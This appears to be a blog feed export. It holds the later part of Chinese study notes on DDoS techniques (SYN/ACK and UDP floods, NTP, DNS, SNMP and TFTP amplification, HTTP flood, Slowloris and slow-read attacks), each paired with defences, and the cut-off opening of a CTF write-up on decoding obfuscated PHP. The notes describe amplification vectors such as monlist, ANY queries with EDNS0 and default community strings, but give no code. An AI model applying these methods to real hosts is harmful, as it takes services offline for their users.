blocks</font>：管理员可以在内存中<strong>为每个SYN请求创建一个小索引(小于16字节)</strong>，而不必把整个连接对象存入内存。</p></li><li><p><font color="6495ED">RST cookies</font>：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。</p></li><li><p><font color="6495ED">STACK tweaking</font>：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括<strong>减小超时时间</strong>，<strong>等到堆栈存释内放时再分配连接</strong>，否则就随机性地删除传入的连接。</p></li></ul><h2 id="ACK-Flood-Attack"><a href="#ACK-Flood-Attack" class="headerlink" title="ACK Flood Attack"></a>ACK Flood Attack</h2><p><code>ACK Flood Attack</code> 是利用TCP三次握手过程。这里可以分为两种。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>攻击者</strong>伪造大量的 <code>SYN+ACK包</code> 发送给目标主机，目标主机每收到一个 <code>SYN+ACK数据包</code> 时，都会去<strong>自己的TCP连接表中查看有没有与ACK的发送者建立连接</strong> ，<strong>如果有则发送ACK包完成TCP连接，如果没有则发送 ACK+RST 断开连接</strong>。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致<font color="6495ED">正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。</font></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" data-fancybox="group" data-caption="ddos_7" class="fancybox"><img alt="ddos_7" title="ddos_7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" class="lazyload"></a></p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p><strong>利用TCP三次握手的ACK+SYN应答</strong>，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。</p><p>通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。<br><strong>防御方案</strong>可参考如下：</p><ul><li>采用CDN进行流量稀释；</li><li>避免服务器IP暴露在公网上；</li><li>通过限速或动态指纹的方式；</li><li>利用对称性判断来分析出是否有攻击存在；</li><li>在连续收到用户发送的ACK包时，中断回话，让其重连。</li></ul><h2 id="UDP-FLood-Attack"><a href="#UDP-FLood-Attack" class="headerlink" title="UDP FLood Attack"></a>UDP FLood Attack</h2><p><code>UDP</code>（<code>User Datagram Protocol</code>，用户数据报协议），是一种<strong>无连接和无状态的网络协议</strong>，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。<code>UDP FLood</code> 可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是<strong>占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" data-fancybox="group" data-caption="ddos_8" class="fancybox"><img alt="ddos_8" title="ddos_8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>限制每秒钟接受到的流量(可能产生误判)；</li><li>通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。</li></ul><hr><h2 id="NTP放大攻击-初步只作点了解"><a href="#NTP放大攻击-初步只作点了解" class="headerlink" title="NTP放大攻击(初步只作点了解)"></a>NTP放大攻击(初步只作点了解)</h2><p><code>NTP</code> (<code>Network Time Protocol</code>，网络时间协议)，是用来使计算机网络时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精度的时间校正，使用 <code>UDP 123</code> 端口进行通信。<br>通常在NTP服务器上会有一些调试接口，而 <strong>利用这些接口中的monlist请求，就可触发放大攻击。</strong> 当<strong>主机</strong>向 <code>NTP服务器</code> 发送 <strong>monlist查询请求</strong> 时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。</p><p>总结一下这种攻击产生的原因:</p><ul><li>请求与响应数据包不等价；</li><li>UDP协议的通信模糊性（无数据传输确认机制）；</li><li>NTP服务器的无认证机制。</li></ul><p>再来谈谈<strong>防御方案</strong>：</p><ul><li>使用防 <code>DDoS</code> 设备进行清洗；</li><li>加固并升级NTP服务器；</li><li>在网络出口封禁 <code>UDP 123</code> 时间同步端口；</li><li>通过网络层或者借助运营商实施 <code>ACL</code> 来防御；</li><li>关闭现在 <code>NTP</code> 服务的 <code>monlist</code> 功能，在 <code>ntp.conf</code>配置文件中增加<code>disable monitor</code> 选项。</li></ul><hr><h2 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h2><p>DNS(Domain Name System，域名系统)，由于使用IP地址来记忆各个网站比较困难，所以就产生了使用主机名称来表示对应的服务器，主机名称通过域名解析的过程转换成IP地址。下面来看一下DNS报文格式，以便了解攻击发生在何处。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" data-fancybox="group" data-caption="ddos_9" class="fancybox"><img alt="ddos_9" title="ddos_9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" class="lazyload"></a></p><p><strong>报文首部格式</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" data-fancybox="group" data-caption="ddos_10" class="fancybox"><img alt="ddos_10" title="ddos_10" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" class="lazyload"></a></p><p>报文首部各字段含义如下，其中高亮是攻击点之一</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" data-fancybox="group" data-caption="ddos_11" class="fancybox"><img alt="ddos_11" title="ddos_11" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" class="lazyload"></a></p><p>下面是问题记录中查询类型可设置的值，发现最后一个ANY类型会请求所有记录，这也是一个攻击点</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" data-fancybox="group" data-caption="ddos_12" class="fancybox"><img alt="ddos_12" title="ddos_12" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" class="lazyload"></a></p><h3 id="DNS递归查询"><a href="#DNS递归查询" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" data-fancybox="group" data-caption="ddos_13" class="fancybox"><img alt="ddos_13" title="ddos_13" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" class="lazyload"></a></p><h3 id="DNS递归查询-1"><a href="#DNS递归查询-1" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" data-fancybox="group" data-caption="ddos_14" class="fancybox"><img alt="ddos_14" title="ddos_14" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" class="lazyload"></a></p><p>从DNS数据包结构以及DNS递归查询过程，我们就可以大致分析出攻击原理。<br>首先，攻击者向 <strong>僵尸网络</strong> 发出指令，使僵尸网络中的每一台主机均发出一个 <strong>伪造源地址的DNS查询请求包</strong>，这些<strong>请求包查询类型设置为ANY</strong>，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。</p><p>接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，<strong>如果迭代查询第一个请求的DNS服务器没有查询到结果</strong>，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而 <strong><font color="6495ED">攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的</font></strong>;</p><p>而<strong>递归查询</strong>却是在查询到结果之后，才返回给查询请求发起者。<br>利用这两个特点，攻击者就可以成功发起DNS放大攻击。<br>这种普通的查询请求可以<strong>将攻击流量放大2~10倍</strong>，如果想增大攻击倍数，可以使用 <code>RFC 2671</code> 中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了 <code>OPT RR</code> 字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" data-fancybox="group" data-caption="ddos_15" class="fancybox"><img alt="ddos_15" title="ddos_15" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>联系 <code>ISP</code> 清洗上游流量；</li><li>DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；</li><li>对单个IP的查询速率做限制；</li><li>拥有足够的带宽承受小规模攻击；</li><li>关闭DNS服务器的递归查询；</li><li>利用防火墙等对 <code>ANY Request</code> 进行过滤。</li></ul><hr><h2 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h2><p><code>SNMP</code> ( <code>Simple Network Management Protocol</code>，简单网络管理协议)，是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维和互联网设备，它使用UDP161端口进行通信。<font color="6495ED">攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。</font>常见的默认通信字符串如<code>public</code>、<code>private</code> 以及一些厂商默认的通信字符串。<strong>GetBulk请求</strong>是在<strong>SNMPv2</strong>中添加的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点。</p><h3 id="下面来看一下SNMP的PDU格式"><a href="#下面来看一下SNMP的PDU格式" class="headerlink" title="下面来看一下SNMP的PDU格式"></a>下面来看一下SNMP的PDU格式</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" data-fancybox="group" data-caption="ddos_16" class="fancybox"><img alt="ddos_16" title="ddos_16" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" class="lazyload"></a></p><p>攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" data-fancybox="group" data-caption="ddos_17" class="fancybox"><img alt="ddos_17" title="ddos_17" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" class="lazyload"></a></p><p>防护方案：</p><ul><li>禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；</li><li>更改默认的通信字符串；</li><li>修改默认端口161；</li><li>隐藏开启SNMP设备的公网IP</li></ul><hr><h2 id="TFTP放大攻击"><a href="#TFTP放大攻击" class="headerlink" title="TFTP放大攻击"></a>TFTP放大攻击</h2><p><code>TFTP</code>（<code>Trivial File Transfer Protocol</code>，简单文件传输协议），使用<code>UDP 69端口</code>进行通信，由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文，以下是TFTP传输文件过程图</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" data-fancybox="group" data-caption="ddos_18" class="fancybox"><img alt="ddos_18" title="ddos_18" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" class="lazyload"></a></p><h3 id="超时重传机制"><a href="#超时重传机制" class="headerlink" title="超时重传机制"></a>超时重传机制</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" data-fancybox="group" data-caption="ddos_19" class="fancybox"><img alt="ddos_19" title="ddos_19" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" class="lazyload"></a></p><p>可以看到，<strong>TFTP协议</strong> 将数据分成好多个数据块进行传输，每个数据块最大为 <strong>512字节</strong>，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。</p><p>攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了。</p><h3 id="TFTP-放大攻击示意图"><a href="#TFTP-放大攻击示意图" class="headerlink" title="TFTP 放大攻击示意图"></a>TFTP 放大攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>不将TFTP服务器暴露在公网上；</li><li>对流经TFTP服务的流量进行入侵检测；</li><li>将重传（数据包）率设置为1；</li><li>只为信任域内的主机提供服务。</li></ul><hr><h2 id="CC-攻击-重点"><a href="#CC-攻击-重点" class="headerlink" title="CC 攻击 (重点)"></a>CC 攻击 (重点)</h2><p><strong>CC攻击 (ChallengeCollapsar)</strong> 又称作 <code>HTTP 泛洪攻击</code>，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。</p><p>这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，<strong><font color="6495ED">因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。</font></strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>必要时将网页做成静态，减少数据库的使用；</li><li>限制连接数量；修改最大超时时间；</li><li>让用户手动输入验证码；</li><li>在response报文中添加特殊字段，验证IP合法性；</li><li>屏蔽频繁访问服务器的主机IP。</li></ul><hr><h2 id="HTTP-慢速攻击"><a href="#HTTP-慢速攻击" class="headerlink" title="HTTP 慢速攻击"></a>HTTP 慢速攻击</h2><p><code>Slow HTTP Dos Attacks</code>（慢速HTTP拒绝服务攻击），黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类，<strong><font color="6495ED">一类是客户端发数据，另一类是客户端读取服务器发来的数据</font></strong>。HTTP慢速攻击对基于线程处理的web服务器影响显著，如 <code>apache、dhttpd</code>，而对基于事件处理的web服务器影响不大，如 <code>ngix、lighttpd。HTTP</code> 慢速攻击还可以细分成以下几种攻击方式。</p><h3 id="Slow-Loris-Attack"><a href="#Slow-Loris-Attack" class="headerlink" title="Slow Loris Attack"></a>Slow Loris Attack</h3><p>HTTP协议规定请求头以一个空行结束，所以 <code>完整的http请求头</code> 结尾是 <code>\r\n\r\n</code>。<br>然而使用非正常的 <code>\r\n</code> 来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。</p><p>两种请求头区别如下，<strong><font color="6495ED">CRLF</font>(Carriage Return Line Feed)</strong> 表示回车换行</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" data-fancybox="group" data-caption="ddos_22" class="fancybox"><img alt="ddos_22" title="ddos_22" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" class="lazyload"></a></p><h3 id="Slow-Post-Attack"><a href="#Slow-Post-Attack" class="headerlink" title="Slow Post Attack"></a>Slow Post Attack</h3><p>在http头部信息，可以使用 <code>content-length</code> 声明HTTP消息实体的传输长度，服务器端会将 <code>content-length</code> 的值作为 <code>HTTP BODY</code> 的长度。(这个好像Struts2 有类似的漏洞)</p><p>利用这一特点，攻击者把 <code>content-length</code> 设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。</p><h3 id="Slow-Read-Attack"><a href="#Slow-Read-Attack" class="headerlink" title="Slow Read Attack"></a>Slow Read Attack</h3><p>攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。</p><p>由于客户端的TCP窗口很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" data-fancybox="group" data-caption="ddos_23" class="fancybox"><img alt="ddos_23" title="ddos_23" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" class="lazyload"></a></p><h3 id="Apache-range-header-Attack"><a href="#Apache-range-header-Attack" class="headerlink" title="Apache range header Attack"></a>Apache range header Attack</h3><p>这种攻击方式只针对 <code>Apache</code>，当客户端传输大文件时会有 <code>range字段</code>，表示将大文件分段，分成几个小段进行传输。<br>例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。</p><h3 id="说一下-Apache-的防护"><a href="#说一下-Apache-的防护" class="headerlink" title="说一下 Apache 的防护"></a>说一下 Apache 的防护</h3><ul><li><strong><font color="6495ED">mod_reqtimeout :</font></strong> 控制请求数据传输的超时时间及最小速率</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" data-fancybox="group" data-caption="ddos_24" class="fancybox"><img alt="ddos_24" title="ddos_24" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_qos :</font></strong> Apache的一个服务质量控制模块，用户可配置各种不同阈值</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" data-fancybox="group" data-caption="ddos_25" class="fancybox"><img alt="ddos_25" title="ddos_25" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_security :</font></strong> 一个开源的WAF模块，有专门针对慢速攻击防护的规则</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" data-fancybox="group" data-caption="ddos_26" class="fancybox"><img alt="ddos_26" title="ddos_26" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" class="lazyload"></a></p><p>其他的中间件防护方案，参考下面的链接</p><hr><h2 id="XSS-DOS-（稍作了解"><a href="#XSS-DOS-（稍作了解" class="headerlink" title="XSS-DOS （稍作了解"></a>XSS-DOS （稍作了解</h2><p>利用网站存在的 <code>存储型XXS漏洞</code>，在网站中插入恶意的js代码。<strong><font color="6495ED">代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求。</font></strong></p><p>客户端访问已插入恶意的javascript代码的页面后，流量如下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" data-fancybox="group" data-caption="ddos_27" class="fancybox"><img alt="ddos_27" title="ddos_27" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" class="lazyload"></a></p><p>由于这种攻击的是由 <code>存储型XSS</code>导致的，因此要考虑如何防护 <code>存储型XSS</code>。</p><p><strong>防护方案</strong>：</p><ul><li>对用户的输入以及url参数进行特殊字符过滤；</li><li>对输出内容进行编码转换；</li><li>结合黑白名单机制。</li></ul><h2 id="时间透镜攻击"><a href="#时间透镜攻击" class="headerlink" title="时间透镜攻击"></a>时间透镜攻击</h2><p>通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。</p><p>这种攻击其实我也还弄不太懂，详细信息可以阅读这篇paper：<a href="http://icir.org/vern/papers/lensing.oak15.pdf" target="_blank" rel="noopener">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>，以及后面的参考链接</p><h3 id="攻击示意图"><a href="#攻击示意图" class="headerlink" title="攻击示意图"></a>攻击示意图</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" data-fancybox="group" data-caption="ddos_28" class="fancybox"><img alt="ddos_28" title="ddos_28" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" data-fancybox="group" data-caption="ddos_29" class="fancybox"><img alt="ddos_29" title="ddos_29" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" class="lazyload"></a></p><p>主要扯一下防护方案：增加抖动，干扰攻击路径，使得数据包无法预期到达；由运营商禁止源路由。<br>其他防御措施：</p><ul><li>采用高性能的网络设备；充足的网络带宽保证；升级主机服务器硬件；</li><li><strong>避免将服务器的真实IP暴露在公网中</strong>；</li><li>使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的。然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用 <code>anycast技术</code> 来防御。</li></ul><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://kb.mazebolt.com/knowledgebase/ack-flood/" target="_blank" rel="noopener">ack flood</a><br><a href="https://zhidao.baidu.com/question/1429836881297848579.html" target="_blank" rel="noopener">DDoS和cc的区别</a><br><a href="https://www.jianshu.com/p/dff5a0d537d8" target="_blank" rel="noopener">什么是cc攻击</a><br><a href="https://www.imperva.com/learn/application-security/" target="_blank" rel="noopener">DDoS的大部分攻击形式</a><br><a href="https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/" target="_blank" rel="noopener">Mitigate Slow HTTP GET/POST Vulnerabilities in the Apache HTTP Server</a><br><a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" target="_blank" rel="noopener">How to Protect Against Slow HTTP Attacks</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&mid=2247483685&idx=1&sn=8ac38ff22d571bbbf7716cb9e83b9b35&chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&mpshare=1&scene=23&srcid=0831Wr5YJPYzSrQU6gnfGVd0" target="_blank" rel="noopener">时间透镜及其在脉冲拒绝服务攻击的应用</a><br>《破坏之王_DDoS攻击与防范深度剖析》(书籍网上有电子档)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析PHP混淆加密</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</id>
    <published>2020-03-26T03:13:59.906Z</published>
    <updated>2020-03-28T03:39:07.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>通过一道题，来看一下php 混淆加密解密原理和分析<br>题目来自 [PWNHUB 公开赛 2018]傻 fufu 的工作日<br>这几天天天盯着这些鬼，眼睛都看瞎了<br>题目是个好题目，我看了Virink师傅和腹黑师傅的题解仍然发现自己很多不懂。还是太菜了<br>好好学习，好好学习</p><hr><h1 id="PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="[PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>[PWNHUB 公开赛 2018]傻 fufu 的工作日</h1><p>点开题目，是个上传，通过扫描后台，发现存在备份文件泄露，得到了 <code>index.php.bak</code><br>文件打开，发现全是乱码，但是注意到了一些细节因此我们来对源码进行一下分析</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" data-fancybox="group" data-caption="decode1" class="fancybox"><img alt="decode1" title="decode1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" class="lazyload"></a></p><p>首先是开头的加密源网站</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span></span><br></pre></td></tr></table></figure></div><p>然后可以看到有颜色的代码最末尾有 <code>return *** ?&gt;</code> 来结束脚本运行，这说明结束标签后面的数据都不会被正常输出，后面极可能是<code>index.php</code> 源码，而前面的 php 代码只是用来加密的。</p><hr><h2 id="解码准备"><a href="#解码准备" class="headerlink" title="解码准备"></a>解码准备</h2><p>因为我的 <code>IDE</code> 是 <code>VSCode</code>，所以安装了 <code>PHP Debug</code> 插件<br>以及需要进行代码缩进格式化<br>然后找到了这个<a href="https://github.com/nikic/PHP-Parser" target="_blank" rel="noopener">工具PHP-Parser</a></p><p>使用工具前要先安装 <code>composer</code><br><a href="https://getcomposer.org/download/" target="_blank" rel="noopener">composer下载地址</a><br><a href="https://developer.aliyun.com/composer" target="_blank" rel="noopener">阿里云镜像</a></p><p>安装好 <code>composer</code> 后，进入下好的 <code>Parser</code> 文件夹，用命令输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></div><p>让其生成所需要的库，然后将下面的代码保存成一个新的文件(例如 <code>format.php</code>)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter 